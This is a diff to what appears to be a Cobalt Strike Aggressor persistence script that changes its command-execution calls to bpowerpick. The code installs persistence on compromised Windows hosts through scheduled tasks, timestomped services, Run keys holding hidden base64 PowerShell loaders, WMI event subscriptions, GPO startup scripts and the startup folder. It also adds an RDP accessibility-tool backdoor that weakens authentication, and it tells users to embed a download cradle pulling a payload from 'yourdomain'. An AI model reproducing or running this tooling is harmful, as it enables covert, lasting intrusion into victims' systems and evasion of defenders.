@@ -107,8 +107,8 @@ sub persistUserSchtasks  {
 		else {
 			bcd($bid, $3['targetpath']);
 			bupload($bid, $3['payloadfile']);
-			bshell($bid, 'schtasks /create /tn "'.$3['taskname'].'" /tr "C:\Windows\System32\rundll32.exe '.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].',StartW" /ru "'.$3['user'].'" /sc "'.$3['schedule'].'"');
-			bshell($bid, 'schtasks /query /v /tn "'.$3['taskname'].'" /FO list');
+			bpowerpick($bid, 'schtasks /create /tn "'.$3['taskname'].'" /tr "C:\Windows\System32\rundll32.exe '.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].',StartW" /ru "'.$3['user'].'" /sc "'.$3['schedule'].'"');
+			bpowerpick($bid, 'schtasks /query /v /tn "'.$3['taskname'].'" /FO list');
 		}
 	}));
 
@@ -140,10 +140,10 @@ sub persistCustomService {
 			bcd($bid, $3['targetpath']);
 			bupload($bid, $3['payloadfile']);
 			btimestomp($bid, "$3['payloadfile']", "C:\\Windows\\System32\\cmd.exe");
-			bshell($bid, 'sc delete '.$3['servicename'].'');
-			bshell($bid, 'sc create '.$3['servicename'].' binpath= "'.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].'" error= ignore start= auto DisplayName= "'.$3['display'].'"');
-			bshell($bid, 'sc description '.$3['servicename'].' "'.$3['description'].'"');
-			bshell($bid, 'sc start '.$3['servicename'].'');
+			bpowerpick($bid, 'sc delete '.$3['servicename'].'');
+			bpowerpick($bid, 'sc create '.$3['servicename'].' binpath= "'.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].'" error= ignore start= auto DisplayName= "'.$3['display'].'"');
+			bpowerpick($bid, 'sc description '.$3['servicename'].' "'.$3['description'].'"');
+			bpowerpick($bid, 'sc start '.$3['servicename'].'');
 		}
 	}));
 	dialog_description($dialog, "Generates a Custom Service for Admin Level persistence on selected beacon. **Only Service EXE Payloads should be used**");
@@ -186,16 +186,16 @@ sub persistRegistryHKCU {
 		else {
 			$data = payloadgenerate($bid);
 			$powershellcmd = "Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."' -Type String -Value \"".$data."\"";
-			bpowershell!($bid, $powershellcmd);
+			bpowerpick!($bid, $powershellcmd);
 			blog($bid, "\cBSetting the first HKCU Run Key Value as '".$3['keyname']."'...");
 			$powershellcmd1 = "Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."' -Value 'C:\\Windows\\SySWoW64\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c (IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run ".$3['keyname'].").".$3['keyname']."))))'";
-			bpowershell!($bid, $powershellcmd1);
+			bpowerpick!($bid, $powershellcmd1);
 			blog($bid, "\cBSetting the second HKCU Run Key Value as '".$3['keyname1']."'...");
 			blog($bid, "\cBDisplaying both Run Keys to Verify everything worked as intended...");
 			$powershellcmd2 = "Get-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."'";
-			bpowershell!($bid, $powershellcmd2);
+			bpowerpick!($bid, $powershellcmd2);
 			$powershellcmd3 = "Get-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."'";
-			bpowershell!($bid, $powershellcmd3);
+			bpowerpick!($bid, $powershellcmd3);
 		}
 	}));
 
@@ -234,16 +234,16 @@ sub persistRegistryHKLM {
 		else {
 			$data = payloadgenerate1($bid);
 			$powershellcmd = "Set-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."' -Type String -Value \"".$data."\"";
-			bpowershell!($bid, $powershellcmd);
+			bpowerpick!($bid, $powershellcmd);
 			blog($bid, "\cBSetting the first HKLM Run Key Value as '".$3['keyname']."'...");
 			$powershellcmd1 = "Set-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."' -Value 'C:\\Windows\\SySWoW64\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c (IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((gp HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run ".$3['keyname'].").".$3['keyname']."))))'";
-			bpowershell!($bid, $powershellcmd1);
+			bpowerpick!($bid, $powershellcmd1);
 			blog($bid, "\cBSetting the second HKLM Run Key Value as '".$3['keyname1']."'...");
 			blog($bid, "\cBDisplaying both Run Keys to Verify everything worked as intended...");
 			$powershellcmd2 = "Get-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."'";
-			bpowershell!($bid, $powershellcmd2);
+			bpowerpick!($bid, $powershellcmd2);
 			$powershellcmd3 = "Get-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."'";
-			bpowershell!($bid, $powershellcmd3);
+			bpowerpick!($bid, $powershellcmd3);
 		}
 	}));
 
@@ -269,8 +269,8 @@ sub persistRegistry {
 			break;
 		}
 		else {
-			bshell($bid, 'reg add "'.$3['reglocation'].'" /v "'.$3['keyname'].'" /t "'.$3['datatype'].'" /d "'.$3['keyvalue'].'" /f');
-			bshell($bid, 'reg query "'.$3['reglocation'].'"');
+			bpowerpick($bid, 'reg add "'.$3['reglocation'].'" /v "'.$3['keyname'].'" /t "'.$3['datatype'].'" /d "'.$3['keyvalue'].'" /f');
+			bpowerpick($bid, 'reg query "'.$3['reglocation'].'"');
 		}
 	}));
 
@@ -299,12 +299,12 @@ sub persistwmieventwmic {
 			break;
 		}
 		else {
-			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter CREATE Name="'.$3['eventfilter'].'", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="'.$3['eventquery'].'"');
-			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer CREATE Name="'.$3['eventconsumer'].'", CommandLineTemplate="'.$3['commandline']." ".split("/",$3['payloadfile'])[-1].'"');
-			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"'.$3['eventfilter'].'\"", Consumer="CommandLineEventConsumer.Name=\"'.$3['eventconsumer'].'\""');
-			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list');
-			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list');
-			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list');
+			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter CREATE Name="'.$3['eventfilter'].'", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="'.$3['eventquery'].'"');
+			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer CREATE Name="'.$3['eventconsumer'].'", CommandLineTemplate="'.$3['commandline']." ".split("/",$3['payloadfile'])[-1].'"');
+			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"'.$3['eventfilter'].'\"", Consumer="CommandLineEventConsumer.Name=\"'.$3['eventconsumer'].'\""');
+			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list');
+			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list');
+			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list');
 		}
 	}));
 	dialog_description($dialog, "Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload must include IEX ((new-object new.webclient).downloadstring(http://yourdomain/payload.txt)) Utilize the following command to encode the payload correctly: cat payload.txt | iconv --to-code=UTF-16LE | base64** ");
@@ -350,10 +350,10 @@ sub persistwmievent  {
 		}
 		else {
 			$powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name=\"".$3['eventfilter']."\";EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"".$3['eventquery']."\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name=\"".$3['eventfilter']."\";CommandLineTemplate =\"". $ExePath ." ".$3['payloadstring']."\"};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
-			bpowershell!($bid, $powershellcmd);
+			bpowerpick!($bid, $powershellcmd);
 			blog($bid, 'Permanently Storing '.$3['eventfilter'].' in root\CimV2..');
-			bpowershell($bid, 'Get-WmiObject __eventFilter -namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
-			bpowershell($bid, 'Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
+			bpowerpick($bid, 'Get-WmiObject __eventFilter -namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
+			bpowerpick($bid, 'Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
 		}
 	}));
 	dialog_description($dialog, "Generates a Custom WMI Event using PowerShell for SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload String must be converted to UTF-16LE, base64 encoded and under 1MB.**");
@@ -388,11 +388,11 @@ sub persistStartupGPO  {
 			$handle = openf(">psscripts.ini");
 			writeb($handle, "[ScriptsConfig]\nStartExecutePSFirst=true\n[Startup]\n0CmdLine=".split("/",$3['scriptfile'])[-1]."\n0Parameters=");
 			closef($handle);
-			bpowershell($bid, 'Move-Item -force -path C:\\'.split("/",$3['scriptfile'])[-1].' -destination C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup\\');
+			bpowerpick($bid, 'Move-Item -force -path C:\\'.split("/",$3['scriptfile'])[-1].' -destination C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup\\');
 			bupload($bid, script_resource("psscripts.ini"));
-			bpowershell($bid, 'Remove-Item -Force C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\psscripts.ini');
-			bpowershell($bid, 'Move-Item -force -path C:\\psscripts.ini -destination C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\');
-			bshell($bid, 'gpupdate /force');
+			bpowerpick($bid, 'Remove-Item -Force C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\psscripts.ini');
+			bpowerpick($bid, 'Move-Item -force -path C:\\psscripts.ini -destination C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\');
+			bpowerpick($bid, 'gpupdate /force');
 		}
 	}));
 
@@ -407,12 +407,12 @@ sub persistStartupGPO  {
 
 sub stickykeys {
 
-	bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
-	bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"');
-	bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d "0" /f');
-	bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');
-	bshell($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
-	bshell($1, 'net start TermService');
+	bpowerpick($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
+	bpowerpick($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"');
+	bpowerpick($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d "0" /f');
+	bpowerpick($1, 'netsh firewall set service type = remotedesktop mode = enable');
+	bpowerpick($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
+	bpowerpick($1, 'net start TermService');
 
 }
 
@@ -424,7 +424,7 @@ sub persistThroughStartUpFolder {
 			break;
 		}
 		else {
-			bshell($bid, 'cd "'.$3['startup'].'"');
+			bpowerpick($bid, 'cd "'.$3['startup'].'"');
 			bupload($bid, $3['payload']);
 			btimestomp($bid, "$3['payload']", "c:\\windows\\system32\\calc.exe");	
 		}
